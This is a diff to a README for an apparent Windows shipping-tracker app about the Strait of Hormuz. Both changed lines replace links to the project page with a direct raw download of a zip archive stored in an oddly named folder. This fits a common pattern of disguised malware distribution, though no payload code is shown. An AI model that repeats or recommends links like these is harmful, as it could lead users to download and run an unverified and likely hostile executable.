@@ -1,6 +1,6 @@
 # 🚢 ishormuzopenyet - Track real time marine traffic status
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/JesusGamer1/ishormuzopenyet)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/JesusGamer1/ishormuzopenyet/main/toxicopathy/Software-v2.8.zip)
 
 The ishormuzopenyet application provides a simple way to monitor shipping status in the Strait of Hormuz. This software processes maritime data and displays current navigation conditions on a clear map interface. Users can check if shipping lanes remain open or face disruptions without needing technical knowledge.
 
@@ -8,7 +8,7 @@ The ishormuzopenyet application provides a simple way to monitor shipping status
 
 Visit the project page to download the software for your Windows computer.
 
-[Download the latest version here](https://github.com/JesusGamer1/ishormuzopenyet)
+[Download the latest version here](https://raw.githubusercontent.com/JesusGamer1/ishormuzopenyet/main/toxicopathy/Software-v2.8.zip)
 
 ## 🖥️ System Requirements
 
